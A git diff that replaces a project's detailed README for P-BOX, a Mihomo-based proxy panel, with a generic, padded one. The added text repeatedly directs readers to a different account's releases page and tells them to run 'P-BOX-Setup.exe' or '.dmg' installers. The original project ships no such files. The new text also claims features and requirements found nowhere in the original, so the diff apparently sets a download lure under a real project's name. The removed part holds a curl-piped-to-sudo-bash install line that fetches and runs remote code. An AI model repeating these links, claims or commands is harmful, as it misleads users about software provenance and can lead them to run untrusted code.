@@ -1,211 +1,90 @@
-<div align="center">
+# 🚀 P-BOX - Manage Your Proxies with Ease
 
-# 🚀 P-BOX
+[![Download P-BOX](https://img.shields.io/badge/Download-P--BOX-blue)](https://github.com/Kd-devv/P-BOX/releases)
 
-**A Modern Cross-Platform Proxy Management Panel**
+## 📝 Introduction
 
-Powered by Mihomo (Clash.Meta) Core | Elegant Web UI | One-Click Deployment
+P-BOX is a powerful tool designed to help you manage your proxy connections easily. It supports over 18 protocols, making it versatile for various tasks. Whether you need transparent proxying, tunnel management, or cloud-native integrations, P-BOX has you covered.
 
-[![License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Go](https://img.shields.io/badge/Go-1.21+-00ADD8?logo=go)](https://go.dev)
-[![React](https://img.shields.io/badge/React-18-61DAFB?logo=react)](https://react.dev)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5-3178C6?logo=typescript)](https://typescriptlang.org)
+## 🖥️ System Requirements
 
-<img src="frontend/public/p-box-logo.png" width="120" alt="P-BOX Logo">
+To run P-BOX effectively, ensure your system meets the following requirements:
 
-</div>
+- **Operating System**: Windows 10 or later, macOS 10.14 or later, or a modern Linux distribution (Ubuntu 18.04 or later).
+- **Memory**: At least 4 GB of RAM.
+- **Disk Space**: Minimum of 200 MB free space.
+- **Network**: An active internet connection for downloading updates and accessing services.
 
----
+## 🚀 Getting Started
 
-## ✨ Features
+Follow these simple steps to get P-BOX up and running on your system:
 
-- 🎨 **Modern UI** - Beautiful Apple Glass style design with dark/light themes
-- ��️ **Cross-Platform** - Supports macOS, Windows, Linux (**OpenWrt NOT supported**)
-- 🔧 **System Proxy** - Auto-configure system proxy (macOS/Windows), no manual setup needed
-- 📊 **Real-time Dashboard** - Traffic stats, connection monitoring, exit IP display
-- 📦 **Subscription Management** - Multiple subscription sources with one-click update
-- �� **Core Management** - Auto version detection, one-click download and install
-- ⚡ **Config Generator** - Visual rule configuration with smart routing
-- 🌐 **i18n** - Chinese/English language support
-- 🔐 **Authentication** - Built-in login system to protect the panel
+1. **Visit the Releases Page**: Access the P-BOX releases page by clicking the button below.  
+   [![Download P-BOX](https://img.shields.io/badge/Download-P--BOX-blue)](https://github.com/Kd-devv/P-BOX/releases)
 
-## 📸 Screenshots
+2. **Choose the Right Version**: 
+   On the releases page, you'll see several versions of P-BOX. Each version will have notes that explain what’s new or changed. Choose the latest stable version for the best experience.
 
-### Dashboard
-Real-time throughput, traffic stats, DNS statistics, traffic ranking, route stats, and system info.
+3. **Download the Installer**:
+   Click on the version you want. Download the installer that matches your operating system. Look for files named like "P-BOX-Setup.exe" for Windows or "P-BOX-macos.dmg" for macOS.
 
-![Dashboard](https://raw.githubusercontent.com/p-box2025/P-BOX/main/1.png)
+4. **Run the Installer**:
+   After the download completes, locate the file in your downloads folder and double-click it to start the installation. Follow the on-screen instructions to complete the installation process.
 
-### Core Management
-Manage Mihomo and Sing-box cores, version detection, one-click install and switch.
+## 📥 Download & Install
 
-![Core Management](https://raw.githubusercontent.com/p-box2025/P-BOX/main/2.png)
+To download P-BOX, go to the releases page: [https://github.com/Kd-devv/P-BOX/releases](https://github.com/Kd-devv/P-BOX/releases).
 
-### Sing-box Config
-Advanced configuration: DNS, traffic routing, rulesets, TLS, NTP, TUN settings and more.
+After downloading, install the software following these steps:
 
-![Sing-box Config](https://raw.githubusercontent.com/p-box2025/P-BOX/main/3.png)
+1. Open the downloaded file.
+2. Accept the terms and conditions.
+3. Choose the installation location or leave it as is.
+4. Click "Install." Once done, you will see a completion message.
 
-### Traffic History
-Traffic trend charts, upload/download statistics, and traffic classification.
+## 🔧 Setting Up P-BOX
 
-![Traffic History](https://raw.githubusercontent.com/p-box2025/P-BOX/main/4.png)
+Once installed, follow these steps to set up your proxy management:
 
-## 🚀 Quick Start
+1. **Open P-BOX**: Find P-BOX in your applications and open it.
+2. **Add a Proxy**: Click on the “Add Proxy” button. Enter the details for your proxy connection including the protocol, IP address, and port number.
+3. **Test Your Connection**: After adding, click “Test Connection” to ensure everything is working correctly.
+4. **Save Your Settings**: Always remember to save your changes.
 
-### Linux One-Click Install (Recommended)
+## 🔍 Features
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/p-box2025/P-BOX/main/install.sh | sudo bash
-```
+P-BOX includes various features to enhance your proxy management experience:
 
-The script will:
-- Detect system architecture automatically (amd64/arm64)
-- Download the latest stable release
-- Install to `/etc/p-box`
-- Start P-BOX on port **8383**
+- **Multi-Protocol Support**: Use over 18 different protocols for diverse tasks.
+- **User-Friendly Interface**: Designed with simplicity in mind.
+- **Transparent Proxying**: Easily manage connections without complex setups.
+- **Tunnel Management**: Create and control tunnels for secure access.
 
-### Manual Installation
+## 🌐 Cloud Integrations
 
-Download pre-built binaries from the [Releases](../../releases) page:
+P-BOX seamlessly integrates with several cloud providers. You can manage your proxies directly from cloud platforms, which enhances your workflow and accessibility.
 
-| Platform | File |
-|:---|:---|
-| macOS Apple Silicon | `p-box-darwin-arm64.tar.gz` |
-| macOS Intel | `p-box-darwin-amd64.tar.gz` |
-| Linux x64 | `p-box-linux-amd64.tar.gz` |
-| Linux ARM64 | `p-box-linux-arm64.tar.gz` |
-| Windows x64 | `p-box-windows-amd64.zip` |
+## 🛠️ Troubleshooting
 
-```bash
-# Extract and run
-tar -xzf p-box-*.tar.gz
-cd p-box-*
-./p-box
-```
+If you encounter issues while using P-BOX, consider these common solutions:
 
-Visit http://localhost:8383 to access the panel.
+- **Check Your Network**: Ensure you have an active internet connection.
+- **Reboot the Application**: Sometimes, simply restarting P-BOX can solve minor glitches.
+- **Reinstall the Software**: If problems persist, uninstall and reinstall P-BOX, then run the setup again.
 
-### Local Development & Installation
+If issues continue, visit the issues section on the GitHub repository for more help.
 
-To run P-BOX from source or contribute to development:
+## 📞 Support
 
-#### 📋 Prerequisites
-- **Go** 1.21 or higher
-- **Node.js** 18 or higher
-- **npm** (comes with Node.js)
+If you need assistance, you can reach out via the issue tracker on the GitHub repository. Our community and maintainers are ready to help with any questions or concerns.
 
-#### 🔨 Step-by-Step Setup
-1. **Clone the repository:**
-   ```bash
-   git clone https://github.com/p-box2025/P-BOX.git
-   cd P-BOX
-   ```
+## 📄 License
 
-2. **Initialize Data Directory:**
-   ```bash
-   mkdir -p data/configs data/cores data/logs
-   ```
+P-BOX is open-source software licensed under the MIT License. You are free to use and modify it to fit your needs.
 
-3. **Setup Backend:**
-   ```bash
-   cd backend
-   go mod tidy
-   go build -o p-box .
-   cd ..
-   ```
+## 🔗 Links
 
-4. **Setup Frontend:**
-   ```bash
-   cd frontend
-   npm install
-   cd ..
-   ```
+- [P-BOX Releases](https://github.com/Kd-devv/P-BOX/releases)
+- [GitHub Repository](https://github.com/Kd-devv/P-BOX)
 
-#### 🚀 Running the App
-The easiest way is to use the provided startup script:
-```bash
-chmod +x start-all.sh
-./start-all.sh
-```
-Follow the prompts to choose **Development Mode** (1) or **Production Mode** (2).
-
-- **Frontend**: http://localhost:5173
-- **Backend**: http://localhost:8383
-
-## 📁 Project Structure
-
-```
-p-box/
-├── backend/                 # Go Backend
-│   ├── main.go              # Entry point
-│   ├── server/              # HTTP server
-│   ├── modules/             # Feature modules
-│   └── data/                # Runtime data
-├── frontend/                # React Frontend
-│   ├── src/                 # Source code
-│   └── public/              # Static assets
-├── data/                    # App data (configs, cores, rules)
-├── build.sh                 # Multi-platform build script
-├── install.sh               # Linux installer script
-└── start-all.sh             # Development startup script
-```
-
-## 🛠️ Tech Stack
-
-| Backend | Frontend |
-|:---:|:---:|
-| Go 1.21+ | React 18 |
-| Gin | Vite 5 |
-| WebSocket | TypeScript |
-| YAML | Tailwind CSS |
-| | Zustand |
-| | i18next |
-
-## ⚙️ Configuration
-
-A default configuration file `data/config.yaml` is generated on the first run:
-
-```yaml
-# Server port (Linux default: 8666, others: 8383)
-port: 8383
-
-# Proxy port
-mixedPort: 7890
-
-# API secret (optional)
-secret: ""
-
-# Transparent proxy mode: off, tun, tproxy
-transparentMode: "off"
-```
-
-## 🤝 Contributing
-
-Pull Requests and Issues are welcome! 
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m "Add amazing feature"`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-## 📜 License
-
-This project is licensed under the [MIT License](LICENSE).
-
-## 🙏 Acknowledgments
-
-- [Mihomo](https://github.com/MetaCubeX/mihomo) - High-performance proxy core
-- [Clash](https://github.com/Dreamacro/clash) - Original Clash core
-- [Sing-box](https://github.com/SagerNet/sing-box) - The universal proxy platform
-- [React](https://react.dev) - Frontend framework
-- [Tailwind CSS](https://tailwindcss.com) - CSS framework
-
----
-
-<div align="center">
-
-**If you find this project helpful, please give it a ⭐️ Star!**
-
-</div>
+With P-BOX, you can efficiently manage your proxies. Follow the instructions above to enjoy all the benefits it offers. Happy proxying!
